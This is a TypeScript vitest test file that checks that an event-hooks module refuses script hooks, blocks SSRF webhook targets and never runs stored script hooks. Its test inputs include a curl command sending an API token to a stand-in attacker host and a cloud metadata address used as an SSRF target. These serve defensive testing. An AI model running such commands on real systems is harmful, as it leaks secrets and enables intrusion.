import { mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it, vi } from 'vitest'

const child = vi.hoisted(() => ({ execSync: vi.fn(() => '') }))
vi.mock('node:child_process', async importOriginal => ({ ...await importOriginal<typeof import('node:child_process')>(), execSync: child.execSync }))

// vitest.setup.ts chdirs into a temporary runtime root; hooks live in <cwd>/.nova-data.
const { createHook, triggerEvent } = await import('./event-hooks.js')

describe('event hooks (R2 MA-9)', () => {
    it('refuses to store shell-string script hooks', () => {
        expect(() => createHook({ name: 'x', event: 'startup', type: 'script', target: 'curl https://evil.example/$NOVA_API_TOKEN' })).toThrow(/Script-Hooks/)
    })

    it('refuses webhooks to private or metadata addresses', () => {
        expect(() => createHook({ name: 'x', event: 'startup', type: 'webhook', target: 'http://169.254.169.254/latest' })).toThrow(/SSRF/)
        expect(() => createHook({ name: 'x', event: 'startup', type: 'webhook', target: 'http://127.0.0.1:3000/api' })).toThrow(/SSRF/)
    })

    it('never executes a previously stored script hook and reports email hooks as not delivered', async () => {
        const dir = join(process.cwd(), '.nova-data')
        mkdirSync(dir, { recursive: true })
        writeFileSync(join(dir, 'hooks.json'), JSON.stringify([
            { id: 'h1', name: 'legacy', event: 'shutdown', type: 'script', target: 'echo pwned', enabled: true, createdAt: 1, triggerCount: 0 },
            { id: 'h2', name: 'mail', event: 'shutdown', type: 'email', target: 'a@example.com', enabled: true, createdAt: 1, triggerCount: 0 },
        ]))
        const results = await triggerEvent('shutdown', {})
        expect(child.execSync).not.toHaveBeenCalled()
        expect(results.map(result => result.success)).toEqual([false, false])
    })
})
